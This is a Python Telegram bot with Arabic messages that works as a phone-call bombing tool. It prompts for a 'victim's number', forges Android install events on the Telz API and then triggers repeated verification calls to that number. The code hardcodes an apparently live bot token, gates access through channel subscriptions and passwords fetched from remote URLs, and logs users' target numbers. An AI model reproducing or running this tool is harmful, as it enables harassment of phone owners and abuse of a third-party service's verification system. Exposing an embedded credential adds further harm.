import csv
import os
import random
import time
import telebot
from telebot import types
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import threading
import json
import requests
import string
import time
import uuid

# إعداد البوت
bot = telebot.TeleBot("7643776609:AAEr1-VWP5Oo7EBvUJuRqM15u9AmhACnD1Y")

# بيانات عامة
user_data = {}
ADMIN_USER_ID = 1180925062
user_ids_file = 'user_ids.json'
user_data_file = 'user_data.csv'  # ملف CSV لتخزين بيانات المستخدمين
if os.path.exists(user_ids_file):
    with open(user_ids_file, 'r') as file:
        content = file.read().strip()
        user_ids = json.loads(content) if content else []
else:
    user_ids = []

waiting_for_message = {}
CHANNEL_USERNAMES = ['@Network_Mysteries']

# حالة البوت (نشط/صامت)
bot_is_active = True

# مدير الخيوط
thread_pool = ThreadPoolExecutor(max_workers=2)

# التحقق من الاشتراك في القنوات
def is_subscribed(user_id):
    try:
        for channel_username in CHANNEL_USERNAMES:
            chat_member = bot.get_chat_member(channel_username, user_id)
            if chat_member.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except Exception:
        return False

# وظيفة إعادة تعيين الاستخدام اليومي
def reset_usage():
    while True:
        now = datetime.now()
        if now.hour == 0 and now.minute == 0:
            # إعادة تعيين البيانات يومياً يمكن تنفيذه هنا
            time.sleep(60)
        time.sleep(30)

# إضافة مستخدم جديد إلى ملف CSV
#k1 = requests.get('https://raw.githubusercontent.com/abdo00alo/abdo/refs/heads/main/link').text.strip()
#k2 = requests.get('https://raw.githubusercontent.com/abdo00alo/abdo/refs/heads/main/password2').text.strip()
#CORRECT_PASSWORD = k2
def add_user_to_csv(user_id, phone_number):
    file_exists = os.path.exists(user_data_file)
    
    with open(user_data_file, mode='a', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        
        if not file_exists:
            # إذا كان الملف جديدًا، أضف العناوين
            writer.writerow(['User ID', 'Phone Number', 'Usage Date', 'Usage Count'])
        
        # إضافة المستخدم
        writer.writerow([user_id, phone_number, str(datetime.now().date()), 1])
        print(f"تم إضافة المستخدم {user_id} برقم الهاتف {phone_number}")

# استرجاع بيانات الاستخدام من CSV
def get_usage_from_csv(user_id, phone_number):
    if os.path.exists(user_data_file):
        with open(user_data_file, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            next(reader, None)  # تخطي السطر الأول (العناوين)
            usage_count = 0
            for row in reader:
                if row[0] == str(user_id) and row[1] == phone_number:
                    usage_count += int(row[3])
            return usage_count
    return 0

# معالج الأوامر: بدء البوت
@bot.message_handler(commands=['start'])
def send_welcome(message):
    global bot_is_active
    if not bot_is_active:
        return  # لا تفعل شيئًا إذا كان البوت في وضع الصمت

    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name

    if not is_subscribed(user_id):
        markup = types.InlineKeyboardMarkup()
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn6)
        bot.send_message(
            message.chat.id,
            "يجب الاشتراك في قنوات البوت لاستخدامه\n\nبعد الاشتراك أرسل /start",
            reply_markup=markup
        )
        return

    if user_id not in user_ids:
        user_ids.append(user_id)
        with open(user_ids_file, 'w') as file:
            json.dump(user_ids, file)
        bot.send_message(
            ADMIN_USER_ID,
            f"مستخدم جديد:\nالاسم: {first_name}\nالمعرف: @{username}\nID: {user_id}"
        )

    if message.chat.id in [ADMIN_USER_ID]:  # التحقق من كون المستخدم من الإدمن
        msg = bot.send_message(message.chat.id, "ادخل رقم الضحية:")
        bot.register_next_step_handler(msg, process_phone_number_sp1)
    else:
        k1 = requests.get('https://raw.githubusercontent.com/abdo00alo/abdo/refs/heads/main/link').text.strip()
        msg = bot.send_message(
            message.chat.id,
            text=f"في البداية صلي على النبي 🤍\n\nثانيًا، تحتاج إلى كلمة مرور لاستخدام البوت.\n\nاحصل عليها من هنا:\n\n{k1}\n\nمش عارف تجيبها؟ شوف الفيديو ده:\nhttps://t.me/python_char_89/116",
            disable_web_page_preview=True
        )
        bot.send_message(message.chat.id, text="لو جبت الباسورد، ارميه هنا: ")
        bot.register_next_step_handler(msg, check_password)

# التحقق من كلمة المرور
# التحقق من كلمة المرور
def check_password(message):
    global bot_is_active
    if not bot_is_active:
        return

    # جلب كلمة المرور من الرابط عند الحاجة
    k2 = requests.get('https://raw.githubusercontent.com/abdo00alo/abdo/refs/heads/main/password2').text.strip()
    CORRECT_PASSWORD = requests.get(k2).text.strip()

    if message.text == CORRECT_PASSWORD:
        bot.send_message(message.chat.id, "صح يسطا\n\nارمي الرقم اللي عايز تكفروا: ")
        bot.register_next_step_handler(message, process_phone_number_sp1)
    else:
        bot.send_message(message.chat.id, "كلمة المرور غير صحيحة!")

# معالجة رقم الهاتف
def process_phone_number_sp1(message):
    global bot_is_active
    if not bot_is_active:
        return

    phone_number = message.text
    bot.send_message(message.chat.id, "الآن أدخل العدد:")
    bot.register_next_step_handler(message, process_send_requests, phone_number)

# إرسال الطلبات
def process_send_requests(message, phone_number):
    global bot_is_active
    if not bot_is_active:
        return

    try:
        request_count = int(message.text)
    except ValueError:
        bot.send_message(message.chat.id, "يرجى إدخال عدد صحيح.")
        return

    user_id = message.chat.id

    # استرجاع عدد الاستخدامات اليومية للرقم
    usage_count_today = get_usage_from_csv(user_id, phone_number)

    if usage_count_today + request_count > 8:
        bot.send_message(user_id, f"لا يمكن استخدام الرقم أكثر من 8مرة يوميًا. المتبقي: {8 - usage_count_today} محاولات.")
        return

    # تحديث سجل الاستخدام
    for _ in range(request_count):
        add_user_to_csv(user_id, phone_number)

    sus, fa = 0, 0
    status_message = bot.send_message(user_id, text=f"""╔═════════════════════
# SEND      {sus}                    {phone_number}
╚═══════════           ╚══════
# FAILD       {fa}      
╚═══════════ 
# By:- @Abdo_1907_A3 
╚═════════════════════""")

    def send_requests():
        nonlocal sus, fa
        for _ in range(request_count):
            if not bot_is_active:
                break

            try:
                timestamp = int(time.time() * 1000)
                random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
                unique_uuid = uuid.uuid4()
                install_url = "https://api.telz.com/app/install"
                auth_call_url = "https://api.telz.com/app/auth_call"

# إعداد ترويسة الطلب
                headers = {
    'User-Agent': "Telz-Android/17.5.17",
    'Content-Type': "application/json"
}

# إعداد حمولة التثبيت
                payload_install = json.dumps({
    "android_id": random_id,
    "app_version": "17.5.17",
    "event": "install",
    "google_exists": "yes",
    "os": "android",
    "os_version": "9",
    "play_market": True,
    "ts": timestamp,
    "uuid": str(unique_uuid)
})
                install_response = requests.post(install_url, data=payload_install, headers=headers)
                print(install_response.text)
                if install_response.ok and "ok" in install_response.text:
                    payload_auth_call = json.dumps({
                "android_id": random_id,
                "app_version": "17.5.17",
                "attempt": "0",
                "event": "auth_call",
                "lang": "ar",
                "os": "android",
                "os_version": "9",
                "phone": f"+2{phone_number}",
                "ts": timestamp,
                "uuid": str(unique_uuid)
            })

                    auth_call_response = requests.post(auth_call_url, data=payload_auth_call, headers=headers)
                    if auth_call_response.ok and "ok" in auth_call_response.text:
                    	sus += 1
                    else:
                    	fa += 1

                    bot.edit_message_text(chat_id=user_id, message_id=status_message.message_id, text=f"""╔═════════════════════
# SEND      {sus}                    {phone_number}
╚═══════════           ╚══════
# FAILD       {fa}      
╚═══════════ 
# By:- @Abdo_1907_A3 
╚═════════════════════""")
                    time.sleep(6)
            except Exception as e:
                print(colored(f"Error during request: {e}", "red"))
                print()
                fa += 1

    thread_pool.submit(send_requests)


# أوامر الإدمن لتشغيل/إيقاف البوت
@bot.message_handler(commands=['stop_bot'])
def stop_bot(message):
    global bot_is_active
    if message.chat.id in [ADMIN_USER_ID]:
        bot_is_active = False
        bot.send_message(message.chat.id, "🚫 تم إيقاف استقبال الرسائل. البوت الآن في وضع الصمت.")

@bot.message_handler(commands=['start_bot'])
def start_bot(message):
    global bot_is_active
    if message.chat.id in [ADMIN_USER_ID]:
        bot_is_active = True
        bot.send_message(message.chat.id, "✅ تم إعادة تشغيل استقبال الرسائل. البوت الآن نشط.")

# بدء البوت
import os
import sys
import time

def restart_bot():
    while True:
        try:
            print("Starting bot...")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Error occurred: {e}")
            with open("bot_errors.log", "a") as error_log:
                error_log.write(f"{datetime.now()}: {e}\n")
            time.sleep(5)  # انتظر 5 ثوانٍ قبل إعادة التشغيل
        except KeyboardInterrupt:
            print("Bot stopped manually.")
            sys.exit(0)  # للخروج عند الإيقاف اليدوي
        except BaseException as critical_error:
            print(f"Critical error occurred: {critical_error}")
            # إعادة تشغيل البوت في حالة الأخطاء الكبيرة
            os.execv(sys.executable, ['python'] + sys.argv)

if __name__ == "__main__":
    restart_bot()
